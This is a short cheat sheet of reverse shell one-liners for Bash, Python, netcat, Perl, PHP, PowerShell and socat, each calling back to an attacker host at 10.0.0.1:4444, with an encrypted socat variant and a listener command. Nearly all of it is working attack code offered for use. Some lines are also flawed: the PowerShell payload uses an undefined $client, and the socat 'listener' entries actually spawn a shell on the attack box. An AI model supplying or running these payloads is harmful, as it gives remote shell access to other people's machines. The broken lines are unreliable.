# Quick Reverse Shells Cheat Sheet

All examples assume:
- LHOST = attacker IP (e.g., 10.0.0.1)
- LPORT = attacker listener port (e.g., 4444)

---

## 🐚 Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

---

## 🐍 Python 3

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

---

## 🐍 Python 2

```bash
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'
```

---

## 🦀 Netcat (with `-e`)

```bash
nc -e /bin/bash 10.0.0.1 4444
```

---

## 🦀 Netcat (without `-e`)

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
```

---

## 🧪 Perl

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## 💾 PHP

```php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 🪟 PowerShell (Windows)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object Net.Sockets.TCPClient("10.0.0.1",4444);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String );$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)}
```

---

## 📦 Socat

### Listener

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

### Reverse Shell

```bash
socat TCP:10.0.0.1:4444 EXEC:/bin/bash
```

---

## 🔒 Encrypted Reverse Shell (socat + certs)

### Listener (with cert)
```bash
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,reuseaddr EXEC:/bin/bash
```

### Client
```bash
socat OPENSSL:10.0.0.1:443 VERIFY-SSL:0 EXEC:/bin/bash
```

---

## 📌 Listener Example

On attack box:
```bash
nc -lvnp 4444
```

---


